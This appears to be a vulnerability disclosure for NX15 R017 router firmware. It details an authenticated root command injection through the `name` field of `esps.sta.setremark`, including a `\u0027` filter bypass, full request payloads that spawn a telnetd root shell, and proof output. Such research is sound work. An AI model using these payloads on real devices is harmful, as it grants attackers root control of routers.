# NX15 R017 `esps.sta.setremark` Post-Authentication Independent root RCE

## 1. Conclusion

On NX15 R017, the following `/api/esps` handler:

- `object = esps.sta`
- `method = setremark`

contains a **new, independent, immediate-trigger post-authentication root RCE**.

- **Endpoint**: `POST /api/esps`
- **Object**: `esps.sta`
- **Method**: `setremark`
- **Injection point**: `name`
- **Privilege requirement**: post-authentication administrator session
- **Impact**: arbitrary command execution as **root**
- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
- **Status**: **Confirmed / Exploited**

This chain is highly valuable because it is not merely command execution that happens incidentally through a wrapper call into a downstream object. Instead:

1. `setremark` itself contains a dangerous `eval`.
2. Exploitation **does not require a valid MAC address**.
3. Even when `mac` is set to `NOT_A_MAC`, a root shell can still be spawned directly.

This demonstrates that the root cause is in `esps.sta.setremark` itself, not in the downstream business logic of `esps.macfilter.modify`.

---

## 2. Root Cause Analysis

Target script:

- `/usr/libexec/rpcd/esps.sta`

### 2.1 `setremark` always enters the dangerous branch

Code:

```sh
userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
...
if [ "$userfilter" == "1" ]; then
    ...
fi
```

The value read here is not the runtime switch `userfilter.basicinfo.enable`, but the capability configuration `ability.macfilter.newforbidden`.

In NX15 R017 firmware:

```sh
etc/config/ability:
option newforbidden '1'
```

Therefore, on the current device, `setremark` **always enters the dangerous branch**, regardless of whether the "forbid new users from accessing the Internet" feature is enabled.

### 2.2 `name` is inserted into JSON and then wrapped in single quotes before `eval`

Inside the dangerous branch:

```sh
json_get_var _mac mac
json_get_var _name name
...
strJson=$(joint_json "$_mac" "$_name" "$netStat")
para="'"$strJson"'"
eval ubus call esps.macfilter modify "$para"
```

The function `joint_json()` is defined as:

```sh
joint_json()
{
    json_init
    json_add_string "mac" "$1"
    json_add_string "description" "$2"
    json_add_string "internet" "$3"
    json_dump
}
```

That means:
- The attacker-controlled `name` is inserted into `strJson` as the JSON `description` field.
- The entire `strJson` value is then wrapped again in **single quotes** as `para='...json...'`.
- The result is finally passed to `eval ubus call esps.macfilter modify "$para"`.

This is a classic case of:

> **JSON string + shell single-quote wrapping + secondary parsing by eval**

Once a real single quote appears in `name`, it can directly break out of the `para='...` shell-quote context and execute attacker-controlled commands.

### 2.3 Why the single quote is reliably exploitable

A request containing a raw literal single quote is blocked by the outer `/api/esps` filter, which returns:

```json
{"code":21,"message":"'"}
```

However, if the raw JSON body uses a JSON Unicode-escaped single quote:

```json
"name":"x\u0027;...;#"
```

then:
- The outer raw-character filter does not directly match it.
- After JSON parsing, the script variable `_name` already contains a real single quote.
- That single quote breaks the shell semantics inside `eval ubus call esps.macfilter modify "$para"`, causing the payload to execute.

---

## 3. Key Static Evidence

### 3.1 The capability switch keeps the dangerous branch always available

```sh
userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
if [ "$userfilter" == "1" ]; then
    ...
fi
```

### 3.2 `name` enters `joint_json`

```sh
json_get_var _name name
strJson=$(joint_json "$_mac" "$_name" "$netStat")
```

### 3.3 The entire JSON string is wrapped in single quotes

```sh
para="'"$strJson"'"
```

### 3.4 `eval` triggers command execution

```sh
eval ubus call esps.macfilter modify "$para"
```

---

## 4. Exploitation Method

### 4.1 A raw literal single quote is blocked by the outer layer

Request:

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "BADMAC2",
      "name": "n';echo DIRQ2_OK >/tmp/dirq2_ok;/usr/sbin/telnetd -p 2478 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

Response:

```json
{"code":21,"message":"'"}
```

### 4.2 With `\u0027`, even an invalid MAC can achieve root RCE

Example successful request:

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "k\u0027;echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

In this request:
- `mac` is intentionally set to the invalid value `NOT_A_MAC`.
- If command execution still succeeds, it proves that **the vulnerability occurs inside `setremark`'s own `eval`**, not in later MAC-processing logic.

---

## 5. Dynamic Verification

### 5.1 `setremark` can be hit directly even with an invalid MAC

Request:

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "k\u0027;echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

Response:

```json
[{"id":1,"result":{"mac":"NOT_A_MAC","name":"k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"}}]
```

The response body clearly deviates from the originally expected format, indicating that the shell semantics have been broken.

### 5.2 Root shell proof

Then connecting to `192.168.8.1:2476` produced:

```text
BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
/ # id; uname -a; cat /tmp/stabadmac_ok 2>/dev/null
uid=0(root) gid=0(root)
Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
STABADMAC_OK
```

This directly proves that:
- Command execution occurs in the root context.
- It is unrelated to later MAC-validity constraints.

## 6. Risk Assessment

After successful exploitation, an attacker can:

- Execute arbitrary commands as root.
- Implant a backdoor directly while the device is online.
- Exploit the issue without preparing a valid business object or an existing terminal entry first.

Because exploitation does not depend on a valid MAC address, the attack cost is lower than many business-logic injection chains.

---

## 7. POC

Implemented POC:

- `poc/postauth_esps_sta_setremark_rce.py`

Execution example:

```bash
python3 poc/postauth_esps_sta_setremark_rce.py --cleanup --port 2476
```

By default, the POC directly uses:

- `--mac NOT_A_MAC`

This highlights that the issue is a wrapper-level `eval` command injection in `setremark` itself.

---

## 8. Conclusion

`esps.sta.setremark` provides a new **immediate post-authentication root RCE**. The root cause is:

- The capability switch `ability.macfilter.newforbidden=1` keeps the dangerous branch always available.
- `name` is written into a JSON string.
- The whole JSON string is then wrapped in shell single quotes as `para='...json...'`.
- The result is passed into `eval ubus call esps.macfilter modify "$para"`.
- `\u0027` can bypass the outer filter and create a real shell breakout inside `eval`.

More importantly, **command execution succeeds even with an invalid MAC address**, proving that the root cause is in `setremark` itself rather than in downstream business logic.
